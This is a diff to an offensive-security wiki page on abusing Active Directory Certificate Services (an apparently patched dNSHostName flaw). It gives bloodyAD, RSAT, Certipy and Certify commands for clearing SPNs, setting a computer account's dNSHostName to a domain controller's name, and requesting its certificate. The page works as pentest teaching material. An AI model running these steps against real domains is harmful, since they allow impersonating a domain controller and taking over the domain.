@@ -25,6 +25,8 @@ A patch was released in may 2022 to address this vulnerability: [more informatio
 
 ## Practice
 
+### Detecting unpatched targets
+
 Requesting a certificate based on the `Machine` (or `User`) template can indicate whether the patch has been applied or not. If the certificate object contains an SID (`objectSid`), then the patch has been applied.
 
 {% tabs %}
@@ -49,80 +51,69 @@ _At the time of writing this recipe, June 2022, no Windows alternative has been 
 {% endtab %}
 {% endtabs %}
 
-The first step of the attack consists of creating a computer account, or have the write permission to the `dNSHostName`, and the `SPN` on any other computer account.
+### Conducting the attack
 
-{% hint style="success" %}
-By default, a domain user can create up to 10 computer accounts by leveraging the [Machine Account Quota](https://www.thehacker.recipes/ad/movement/domain-settings/machineaccountquota) (MAQ) attribute.
-{% endhint %}
+#### Creating a computer account
 
-{% tabs %}
-{% tab title="UNIX-like" %}
-Verification of the MAQ attribute value using [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec).
+The first step of the attack consists in creating a computer account ([machineaccountquota.md](../domain-settings/machineaccountquota.md "mention"), [#create-a-computer-account](../domain-settings/machineaccountquota.md#create-a-computer-account "mention")), or have the write permission to the `dNSHostName` and `servicePrincipalName` attributes of another.
 
-```bash
-cme ldap $DOMAIN_CONTROLLER -d $DOMAIN_FQDN -u $USER_NAME -p $USER_PASSWORD -M maq
-```
+#### `dNSHostName` and `servicePrincipalName` modification
 
-Creating a computer account using [Impacket](https://github.com/SecureAuthCorp/impacket)'s addcomputer.py script.
-
-```bash
-addcomputer.py $DOMAIN_FQDN/$USER_NAME:$USER_PASSWORD -computer-name $COMPUTER_NAME -computer-pass $COMPUTER_PASSWORD
-```
-{% endtab %}
-{% endtabs %}
-
-The second step is conducted by removing the `RestrictedKrbHost` and `HOST` entry (of the `SPN`), and then modifying the `dNSHostName` to the name of the computer account to usurpate.
+The second step is conducted by removing the SPNs that reflect the `dNSHostName` value, and then modifying the `dNSHostName` to the name of the computer account to impersonate.
 
 {% tabs %}
 {% tab title="UNIX-like" %}
-Using the [bloodyAD](https://github.com/CravateRouge/bloodyAD) tool.
+The [bloodyAD](https://github.com/CravateRouge/bloodyAD) (Python) tool can be used on UNIX-like systems to operated these changes.
 
+{% code overflow="wrap" %}
 ```bash
-# Removing all the SPN entries
-python3 bloodyAD.py -d $DOMAIN_FQDN -u $USER_NAME -p $USER_PASSWORD --host $DC_IP setAttribute 'CN=$COMPUTER_NAME,CN=Computers,DC=$DC,DC=$DC' serviceprincipalname '[]'
+# Clearing the SPNs
+bloodyAD.py -d $DOMAIN_FQDN -u $USER_NAME -p $USER_PASSWORD --host $DC_IP setAttribute 'CN=$COMPUTER_NAME,CN=Computers,DC=$DC,DC=$DC' serviceprincipalname '[]'
 
-# Adding a dNSHostName value to the name of a computer account to usurpate
-python3 bloodyAD.py -d $DOMAIN_FQDN -u $USER_NAME -p $USER_PASSWORD --host $DC_IP setAttribute 'CN=$COMPUTER_NAME,CN=Computers,DC=$DC,DC=$DC' dnsHostName '["$DC_NAME.$DOMAIN_FQDN"]'
+# Setting the dNSHostName value to the name of a computer account to impersonate
+bloodyAD.py -d $DOMAIN_FQDN -u $USER_NAME -p $USER_PASSWORD --host $DC_IP setAttribute 'CN=$COMPUTER_NAME,CN=Computers,DC=$DC,DC=$DC' dnsHostName '["$DC_NAME.$DOMAIN_FQDN"]'
 
-# Verifying the setted dNSHostName value and SPN entries
-python3 bloodyAD.py -d $DOMAIN_FQDN -u $USER_NAME -p $USER_PASSWORD --host $DC_IP getObjectAttributes 'CN=$COMPUTER_NAME,CN=Computers,DC=$DC,DC=$DC' dnsHostName,serviceprincipalname
+# Verifying the dNSHostName value and SPN entries
+bloodyAD.py -d $DOMAIN_FQDN -u $USER_NAME -p $USER_PASSWORD --host $DC_IP getObjectAttributes 'CN=$COMPUTER_NAME,CN=Computers,DC=$DC,DC=$DC' dnsHostName,serviceprincipalname
 ```
+{% endcode %}
 
 {% hint style="info" %}
-The Domain Component (DC) will depend on the targeted domain:
-
-* Example with `hacker.com`: `DC=hacker,DC=com`
-* Exemple with `the.hacker.com`: `DC=the,DC=hacker,DC=com`
+The Domain Components (DC) are the different parts of the domain name (`DC=domain,DC=local` for `domain.local`, or `DC=sub,DC=domain,DC=local` for `sub.domain.local`).
 {% endhint %}
 {% endtab %}
 
 {% tab title="Windows" %}
-Using the [Active Directory RSAT](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps) tools.
+The [Active Directory RSAT](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps) tools can be used on Windows systems to operate these changes.
 
 ```bash
-# Removing all the SPN entries
+# Clearing the SPNs
 Set-ADComputer $COMPUTER_NAME -ServicePrincipalName @{}
 
-# Adding a dNSHostName value to the name of a computer account to usurpate
+# Setting the dNSHostName value to the name of a computer account to impersonate
 Set-ADComputer $COMPUTER_NAME -DnsHostName $DC_NAME.$DOMAIN_FQDN
 
-# Verifying the setted dNSHostName value and SPN entries
+# Verifying the dNSHostName value and SPN entries
 Get-ADComputer $COMPUTER_NAME -properties dnshostname,serviceprincipalname
 ```
 {% endtab %}
 {% endtabs %}
 
-The third and last step consists on getting the certificate of the targeted machine account (`$DC_NAME` in the previous command examples).
+#### Obtaining a certificate
+
+The third and last step consists in getting the certificate of the targeted machine account (`$DC_NAME` in the previous command examples).
 
 {% tabs %}
 {% tab title="UNIX-like" %}
-Using [Certipy](https://www.google.com/url?sa=t\&rct=j\&q=\&esrc=s\&source=web\&cd=\&cad=rja\&uact=8\&ved=2ahUKEwjCp86j1fb3AhWpzYUKHSMeBFoQFnoECA8QAQ\&url=https%3A%2F%2Fgithub.com%2Fly4k%2FCertipy\&usg=AOvVaw1D9CAn7Ysn5XMdezp8Aemb) we can request a certificate.
+[Certipy](https://github.com/ly4k/Certipy) (Python) can be used to request the certificate from UNIX-like systems.
 
+{% code overflow="wrap" %}
 ```bash
-certipy req $DOMAIN_FQDN/$COMPUTER_NAME\$:$COMPUTER_PASSWORD@$CA_SERVER_IP -ca $CA_NAME -template Machine
+certipy req -u 'compter$'@'domain.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -template 'Machine'
 ```
+{% endcode %}
 
-The certificate can then be used with [Pass-the-Certificate](https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate) to obtain a TGT and authenticate.
+The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-the-certificate.md) to obtain a TGT and authenticate.
 
 {% hint style="info" %}
 By default, Certipy uses LDAPS, which is not always supported by the domain controllers. The `-scheme` flag can be used to set whether to use LDAP or LDAPS.
@@ -130,11 +121,13 @@ By default, Certipy uses LDAPS, which is not always supported by the domain cont
 {% endtab %}
 
 {% tab title="Windows" %}
-Using [Certify](https://www.google.com/url?sa=t\&rct=j\&q=\&esrc=s\&source=web\&cd=\&cad=rja\&uact=8\&ved=2ahUKEwiQmZer1fb3AhVBhRoKHSCyAMoQFnoECAcQAQ\&url=https%3A%2F%2Fgithub.com%2FGhostPack%2FCertify\&usg=AOvVaw0HjmYWwbHvGKTA3-f1iPP0) we can request a certificate.
+[Certify](https://www.google.com/url?sa=t\&rct=j\&q=\&esrc=s\&source=web\&cd=\&cad=rja\&uact=8\&ved=2ahUKEwiQmZer1fb3AhVBhRoKHSCyAMoQFnoECAcQAQ\&url=https%3A%2F%2Fgithub.com%2FGhostPack%2FCertify\&usg=AOvVaw0HjmYWwbHvGKTA3-f1iPP0) (C#) can be used to request the certificate from Windows systems.
 
-```bash
-Certify.exe request /ca:$DOMAIN_FQDN\$CA_NAME /template:Machine
+{% code overflow="wrap" %}
+```batch
+Certify.exe request /ca:"domain\ca" /template:"Machine"
 ```
+{% endcode %}
 
 The certificate can then be used with [Pass-the-Certificate](https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate) to obtain a TGT and authenticate.
 {% endtab %}
